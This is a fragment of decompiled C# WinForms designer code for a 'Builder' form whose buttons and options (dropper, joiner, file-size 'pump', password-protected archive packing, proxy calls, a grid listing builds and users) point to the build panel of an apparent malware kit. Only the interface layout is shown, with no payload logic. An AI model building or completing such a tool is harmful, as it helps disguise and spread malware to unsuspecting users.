		this.rjButtonBuildSFX.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonBuildSFX.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonBuildSFX.ForeColor = System.Drawing.Color.White;
		this.rjButtonBuildSFX.Location = new System.Drawing.Point(21, 298);
		this.rjButtonBuildSFX.Name = "rjButtonBuildSFX";
		this.rjButtonBuildSFX.Size = new System.Drawing.Size(93, 42);
		this.rjButtonBuildSFX.TabIndex = 62;
		this.rjButtonBuildSFX.Text = "Build + SFX";
		this.rjButtonBuildSFX.TextColor = System.Drawing.Color.White;
		this.rjButtonBuildSFX.UseVisualStyleBackColor = false;
		this.rjButtonBuildSFX.Click += new System.EventHandler(BuildSFX_Click);
		this.rjButton10.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton10.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton10.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton10.BorderRadius = 0;
		this.rjButton10.BorderSize = 0;
		this.rjButton10.FlatAppearance.BorderSize = 0;
		this.rjButton10.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton10.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton10.ForeColor = System.Drawing.Color.White;
		this.rjButton10.Location = new System.Drawing.Point(21, 154);
		this.rjButton10.Name = "rjButton10";
		this.rjButton10.Size = new System.Drawing.Size(291, 42);
		this.rjButton10.TabIndex = 51;
		this.rjButton10.Text = "Build + Dropper + Pump";
		this.rjButton10.TextColor = System.Drawing.Color.White;
		this.rjButton10.UseVisualStyleBackColor = false;
		this.rjButton10.Click += new System.EventHandler(rjButton10_Click);
		this.rjButton9.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton9.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton9.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton9.BorderRadius = 0;
		this.rjButton9.BorderSize = 0;
		this.rjButton9.FlatAppearance.BorderSize = 0;
		this.rjButton9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton9.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton9.ForeColor = System.Drawing.Color.White;
		this.rjButton9.Location = new System.Drawing.Point(21, 106);
		this.rjButton9.Name = "rjButton9";
		this.rjButton9.Size = new System.Drawing.Size(154, 42);
		this.rjButton9.TabIndex = 50;
		this.rjButton9.Text = "Build + Dropper + Join";
		this.rjButton9.TextColor = System.Drawing.Color.White;
		this.rjButton9.UseVisualStyleBackColor = false;
		this.rjButton9.Click += new System.EventHandler(rjButton9_Click);
		this.rjButton8.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton8.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton8.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton8.BorderRadius = 0;
		this.rjButton8.BorderSize = 0;
		this.rjButton8.FlatAppearance.BorderSize = 0;
		this.rjButton8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton8.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton8.ForeColor = System.Drawing.Color.White;
		this.rjButton8.Location = new System.Drawing.Point(181, 106);
		this.rjButton8.Name = "rjButton8";
		this.rjButton8.Size = new System.Drawing.Size(131, 42);
		this.rjButton8.TabIndex = 49;
		this.rjButton8.Text = "Build + Dropper";
		this.rjButton8.TextColor = System.Drawing.Color.White;
		this.rjButton8.UseVisualStyleBackColor = false;
		this.rjButton8.Click += new System.EventHandler(rjButton8_Click);
		this.rjButton7.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton7.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton7.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton7.BorderRadius = 0;
		this.rjButton7.BorderSize = 0;
		this.rjButton7.FlatAppearance.BorderSize = 0;
		this.rjButton7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton7.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton7.ForeColor = System.Drawing.Color.White;
		this.rjButton7.Location = new System.Drawing.Point(219, 58);
		this.rjButton7.Name = "rjButton7";
		this.rjButton7.Size = new System.Drawing.Size(93, 42);
		this.rjButton7.TabIndex = 48;
		this.rjButton7.Text = "Build + Join";
		this.rjButton7.TextColor = System.Drawing.Color.White;
		this.rjButton7.UseVisualStyleBackColor = false;
		this.rjButton7.Click += new System.EventHandler(rjButton7_Click);
		this.rjButton6.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton6.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton6.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton6.BorderRadius = 0;
		this.rjButton6.BorderSize = 0;
		this.rjButton6.FlatAppearance.BorderSize = 0;
		this.rjButton6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton6.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton6.ForeColor = System.Drawing.Color.White;
		this.rjButton6.Location = new System.Drawing.Point(120, 58);
		this.rjButton6.Name = "rjButton6";
		this.rjButton6.Size = new System.Drawing.Size(93, 42);
		this.rjButton6.TabIndex = 47;
		this.rjButton6.Text = "Build Pump";
		this.rjButton6.TextColor = System.Drawing.Color.White;
		this.rjButton6.UseVisualStyleBackColor = false;
		this.rjButton6.Click += new System.EventHandler(rjButton6_Click);
		this.rjButton5.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton5.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton5.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton5.BorderRadius = 0;
		this.rjButton5.BorderSize = 0;
		this.rjButton5.FlatAppearance.BorderSize = 0;
		this.rjButton5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton5.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton5.ForeColor = System.Drawing.Color.White;
		this.rjButton5.Location = new System.Drawing.Point(21, 58);
		this.rjButton5.Name = "rjButton5";
		this.rjButton5.Size = new System.Drawing.Size(93, 42);
		this.rjButton5.TabIndex = 46;
		this.rjButton5.Text = "Build";
		this.rjButton5.TextColor = System.Drawing.Color.White;
		this.rjButton5.UseVisualStyleBackColor = false;
		this.rjButton5.Click += new System.EventHandler(rjButton5_Click);
		this.checkBox11.AutoSize = true;
		this.checkBox11.Location = new System.Drawing.Point(400, 13);
		this.checkBox11.Name = "checkBox11";
		this.checkBox11.Size = new System.Drawing.Size(92, 17);
		this.checkBox11.TabIndex = 54;
		this.checkBox11.Text = "Install Archive";
		this.checkBox11.UseVisualStyleBackColor = true;
		this.checkBox11.CheckedChanged += new System.EventHandler(checkBox11_CheckedChanged);
		this.rjComboBox4.BackColor = System.Drawing.Color.White;
		this.rjComboBox4.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox4.BorderSize = 1;
		this.rjComboBox4.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox4.Enabled = false;
		this.rjComboBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox4.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox4.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox4.Items.AddRange(new object[3] { "7zip", "rar", "zip" });
		this.rjComboBox4.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox4.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox4.Location = new System.Drawing.Point(400, 36);
		this.rjComboBox4.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox4.Name = "rjComboBox4";
		this.rjComboBox4.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox4.Size = new System.Drawing.Size(304, 30);
		this.rjComboBox4.TabIndex = 52;
		this.rjComboBox4.Texts = "7zip";
		this.rjTextBox10.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox10.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox10.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox10.BorderRadius = 0;
		this.rjTextBox10.BorderSize = 1;
		this.rjTextBox10.Enabled = false;
		this.rjTextBox10.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox10.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox10.Location = new System.Drawing.Point(400, 73);
		this.rjTextBox10.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox10.Multiline = false;
		this.rjTextBox10.Name = "rjTextBox10";
		this.rjTextBox10.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox10.PasswordChar = false;
		this.rjTextBox10.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox10.PlaceholderText = "archive name";
		this.rjTextBox10.Size = new System.Drawing.Size(304, 31);
		this.rjTextBox10.TabIndex = 53;
		this.rjTextBox10.Texts = "";
		this.rjTextBox10.UnderlinedStyle = false;
		this.checkBox12.AutoSize = true;
		this.checkBox12.Location = new System.Drawing.Point(400, 111);
		this.checkBox12.Name = "checkBox12";
		this.checkBox12.Size = new System.Drawing.Size(110, 17);
		this.checkBox12.TabIndex = 55;
		this.checkBox12.Text = "Archive password";
		this.checkBox12.UseVisualStyleBackColor = true;
		this.rjTextBox11.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox11.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox11.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox11.BorderRadius = 0;
		this.rjTextBox11.BorderSize = 1;
		this.rjTextBox11.Enabled = false;
		this.rjTextBox11.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox11.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox11.Location = new System.Drawing.Point(400, 135);
		this.rjTextBox11.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox11.Multiline = false;
		this.rjTextBox11.Name = "rjTextBox11";
		this.rjTextBox11.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox11.PasswordChar = false;
		this.rjTextBox11.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox11.PlaceholderText = "archive password";
		this.rjTextBox11.Size = new System.Drawing.Size(304, 31);
		this.rjTextBox11.TabIndex = 56;
		this.rjTextBox11.Texts = "";
		this.rjTextBox11.UnderlinedStyle = false;
		this.checkBox13.AutoSize = true;
		this.checkBox13.Location = new System.Drawing.Point(400, 173);
		this.checkBox13.Name = "checkBox13";
		this.checkBox13.Size = new System.Drawing.Size(78, 17);
		this.checkBox13.TabIndex = 57;
		this.checkBox13.Text = "Build name";
		this.checkBox13.UseVisualStyleBackColor = true;
		this.rjTextBox12.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox12.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox12.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox12.BorderRadius = 0;
		this.rjTextBox12.BorderSize = 1;
		this.rjTextBox12.Enabled = false;
		this.rjTextBox12.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox12.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox12.Location = new System.Drawing.Point(400, 197);
		this.rjTextBox12.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox12.Multiline = false;
		this.rjTextBox12.Name = "rjTextBox12";
		this.rjTextBox12.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox12.PasswordChar = false;
		this.rjTextBox12.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox12.PlaceholderText = "build name";
		this.rjTextBox12.Size = new System.Drawing.Size(304, 31);
		this.rjTextBox12.TabIndex = 58;
		this.rjTextBox12.Texts = "";
		this.rjTextBox12.UnderlinedStyle = false;
		this.checkBox14.AutoSize = true;
		this.checkBox14.Location = new System.Drawing.Point(400, 235);
		this.checkBox14.Name = "checkBox14";
		this.checkBox14.Size = new System.Drawing.Size(78, 17);
		this.checkBox14.TabIndex = 59;
		this.checkBox14.Text = "Build pump";
		this.checkBox14.UseVisualStyleBackColor = true;
		this.rjTextBox13.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox13.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox13.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox13.BorderRadius = 0;
		this.rjTextBox13.BorderSize = 1;
		this.rjTextBox13.Enabled = false;
		this.rjTextBox13.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox13.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox13.Location = new System.Drawing.Point(400, 259);
		this.rjTextBox13.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox13.Multiline = false;
		this.rjTextBox13.Name = "rjTextBox13";
		this.rjTextBox13.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox13.PasswordChar = false;
		this.rjTextBox13.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox13.PlaceholderText = "pump";
		this.rjTextBox13.Size = new System.Drawing.Size(97, 31);
		this.rjTextBox13.TabIndex = 60;
		this.rjTextBox13.Texts = "";
		this.rjTextBox13.UnderlinedStyle = false;
		this.rjComboBox5.BackColor = System.Drawing.Color.White;
		this.rjComboBox5.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox5.BorderSize = 1;
		this.rjComboBox5.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox5.Enabled = false;
		this.rjComboBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox5.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox5.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox5.Items.AddRange(new object[3] { "KB", "MB", "GB" });
		this.rjComboBox5.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox5.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox5.Location = new System.Drawing.Point(504, 259);
		this.rjComboBox5.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox5.Name = "rjComboBox5";
		this.rjComboBox5.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox5.Size = new System.Drawing.Size(200, 30);
		this.rjComboBox5.TabIndex = 62;
		this.rjComboBox5.Texts = "MB";
		this.tabPage5.Controls.Add(this.GridBuilds);
		this.tabPage5.ImageKey = "lets-icons_paper-fill.png";
		this.tabPage5.Location = new System.Drawing.Point(4, 23);
		this.tabPage5.Name = "tabPage5";
		this.tabPage5.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage5.Size = new System.Drawing.Size(865, 398);
		this.tabPage5.TabIndex = 4;
		this.tabPage5.Text = "Builds";
		this.tabPage5.UseVisualStyleBackColor = true;
		this.GridBuilds.AllowUserToAddRows = false;
		this.GridBuilds.AllowUserToDeleteRows = false;
		this.GridBuilds.AllowUserToResizeColumns = false;
		this.GridBuilds.AllowUserToResizeRows = false;
		this.GridBuilds.BackgroundColor = System.Drawing.Color.White;
		this.GridBuilds.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridBuilds.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridBuilds.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle15.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle15.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle15.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle15.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridBuilds.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle15;
		this.GridBuilds.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridBuilds.Columns.AddRange(this.ColumnBuildName, this.ColumnGroup, this.ColumnProcess, this.ColumnUsers, this.ColumnDateCreated, this.ColumnBuildPath);
		this.GridBuilds.ContextMenuStrip = this.contextMenuBuilds;
		this.GridBuilds.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle16.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle16.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle16.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle16.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle16.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle16.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridBuilds.DefaultCellStyle = dataGridViewCellStyle16;
		this.GridBuilds.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridBuilds.EnableHeadersVisualStyles = false;
		this.GridBuilds.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridBuilds.Location = new System.Drawing.Point(3, 3);
		this.GridBuilds.Name = "GridBuilds";
		this.GridBuilds.ReadOnly = true;
		this.GridBuilds.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		this.GridBuilds.RowHeadersVisible = false;
		this.GridBuilds.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridBuilds.ShowCellErrors = false;
		this.GridBuilds.ShowCellToolTips = false;
		this.GridBuilds.ShowEditingIcon = false;
		this.GridBuilds.ShowRowErrors = false;
		this.GridBuilds.Size = new System.Drawing.Size(859, 392);
		this.GridBuilds.TabIndex = 48;
		this.GridBuilds.CellDoubleClick += new System.Windows.Forms.DataGridViewCellEventHandler(GridBuilds_CellDoubleClick);
		this.ColumnBuildName.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnBuildName.HeaderText = "Build Name";
		this.ColumnBuildName.Name = "ColumnBuildName";
		this.ColumnBuildName.ReadOnly = true;
		this.ColumnGroup.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnGroup.HeaderText = "Group";
		this.ColumnGroup.Name = "ColumnGroup";
		this.ColumnGroup.ReadOnly = true;
		this.ColumnProcess.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnProcess.HeaderText = "Process Name";
		this.ColumnProcess.Name = "ColumnProcess";
		this.ColumnProcess.ReadOnly = true;
		this.ColumnUsers.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnUsers.HeaderText = "Users";
		this.ColumnUsers.Name = "ColumnUsers";
		this.ColumnUsers.ReadOnly = true;
		this.ColumnDateCreated.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnDateCreated.HeaderText = "Date Created";
		this.ColumnDateCreated.Name = "ColumnDateCreated";
		this.ColumnDateCreated.ReadOnly = true;
		this.ColumnBuildPath.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnBuildPath.HeaderText = "Build Path";
		this.ColumnBuildPath.Name = "ColumnBuildPath";
		this.ColumnBuildPath.ReadOnly = true;
		this.contextMenuBuilds.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.menuDelete, this.menuClear });
		this.contextMenuBuilds.Name = "contextMenuBuilds";
		this.contextMenuBuilds.Size = new System.Drawing.Size(108, 48);
		this.menuDelete.Name = "menuDelete";
		this.menuDelete.Size = new System.Drawing.Size(107, 22);
		this.menuDelete.Text = "Delete";
		this.menuDelete.Click += new System.EventHandler(menuDelete_Click);
		this.menuClear.Name = "menuClear";
		this.menuClear.Size = new System.Drawing.Size(107, 22);
		this.menuClear.Text = "Clear";
		this.menuClear.Click += new System.EventHandler(menuClear_Click);
		this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)componentResourceManager.GetObject("imageList1.ImageStream");
		this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.imageList1.Images.SetKeyName(0, "-build_90148.png");
		this.imageList1.Images.SetKeyName(1, "file_settings_icon_207200.png");
		this.imageList1.Images.SetKeyName(2, "settings-cogwheel-button_icon-icons.com_72559.png");
		this.imageList1.Images.SetKeyName(3, "server_78939.png");
		this.imageList1.Images.SetKeyName(4, "lets-icons_paper-fill.png");
		this.checkBox10.AutoSize = true;
		this.checkBox10.Checked = true;
		this.checkBox10.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBox10.Location = new System.Drawing.Point(460, 64);
		this.checkBox10.Name = "checkBox10";
		this.checkBox10.Size = new System.Drawing.Size(72, 17);
		this.checkBox10.TabIndex = 42;
		this.checkBox10.Text = "Proxy Call";
		this.checkBox10.UseVisualStyleBackColor = true;
		this.checkBox15.AutoSize = true;
		this.checkBox15.Checked = true;
		this.checkBox15.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBox15.Location = new System.Drawing.Point(530, 64);
		this.checkBox15.Name = "checkBox15";
		this.checkBox15.Size = new System.Drawing.Size(81, 17);
		this.checkBox15.TabIndex = 43;
		this.checkBox15.Text = "Many Proxy";
		this.checkBox15.UseVisualStyleBackColor = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(879, 492);
		base.Controls.Add(this.materialTabControl1);
		base.DrawerAutoHide = false;
		base.DrawerShowIconsWhenHidden = true;
		base.DrawerTabControl = this.materialTabControl1;
		this.MinimumSize = new System.Drawing.Size(809, 465);
		base.Name = "FormBulider";
		this.Text = "Builder";
		base.Load += new System.EventHandler(FormBulider_Load);
		this.materialTabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		this.tabPage1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.GridIps).EndInit();
		this.tabPage2.ResumeLayout(false);
		this.tabPage2.PerformLayout();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		this.tabPage3.ResumeLayout(false);
		this.tabPage3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.panel4.ResumeLayout(false);
		this.panel4.PerformLayout();
		this.tabPage4.ResumeLayout(false);
		this.tabPage4.PerformLayout();
		this.tabPage5.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.GridBuilds).EndInit();
		this.contextMenuBuilds.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
